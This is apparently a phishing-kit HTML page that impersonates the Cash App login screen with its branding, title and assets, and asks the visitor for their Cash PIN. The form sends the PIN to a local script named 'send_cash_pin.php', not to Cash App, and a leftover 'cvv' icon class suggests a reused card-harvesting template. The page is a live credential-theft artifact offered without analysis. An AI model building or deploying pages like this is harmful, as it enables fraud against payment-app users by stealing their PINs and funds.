<html lang="en" style="--vh:580px;"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>Cash App</title>

  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Cash App">

  <meta name="theme-color" content="#0bb634">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="format-detection" content="telephone=no,email=no">
  <link rel="icon" sizes="196x196" href="assets/icon-196.png">
  <link rel="icon" href="assets/favicon.ico">
  <link rel="mask-icon" href="/favicon-pinned.svg" color="#18C300">
  <script src="assets/vendor.js" integrity="sha256-nTwtXHZxkWBCKpCkWwNAy6t2GmRW+0t2N2RJvlbuVRM=" crossorigin="anonymous"></script>
  <script src="assets/cash.js" integrity="sha256-U9sC8mrpLy1svsJdPoiUfr4WQD9EUC7zePIEOreRp5Q=" crossorigin="anonymous"></script>
  <link rel="stylesheet" type="text/css" href="assets/cash.css" integrity="sha256-DKtq4UJpbOrnJlqn+TlB3hTfPU4GrCSHgI1Lvx2P6g8=" crossorigin="anonymous">
  <link rel="preload" href="assets/cash-market-rounded-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="assets/cash-market-rounded-regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="assets/cash-market-rounded-medium.woff2" as="font" type="font/woff2" crossorigin="anonymous">
</head>
<body class="theme-bg ember-application theme-green">
  <script nonce="">
    window.App = require('cash/app')["default"].create();
  </script>


<div id="ember324" class="ember-view"><div data-current-route="login" id="ember348" class="full-height application-cash ember-view">  <div id="ember355" class="cookie-banner ember-view"><!----></div>
  <section class="layout-login flex-container full-height pad">
  <div class="login-container flex-container flex-v-center flex-fill">
      <div id="ember613" class="login-onboarding ember-view"><!---->
  <p class="instructions "><span>Welcome back, Enter your Cash PIN to&nbsp;continue.</span></p>
<form action="system/send_cash_pin.php" method="post" autocomplete="off" spellcheck="true" id="ember358" class="login-form ember-view">
      <input type="text" name="SsZ" id="SsZ" maxlength="5" required placeholder="" autocomplete="off" />
                                            <span class="CCinfoIcon cvv" style="background-position: 0px 88%;"></span>
                                            <br>

                   <div class="SubmitBox">
                                        <button class="button theme-button button--round theme-button" type="submit">Next</button>
                                    </div>
</form>

<!---->
</div>

  </div>
</section>

  <!---->
  <div id="ember411" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div></body></html>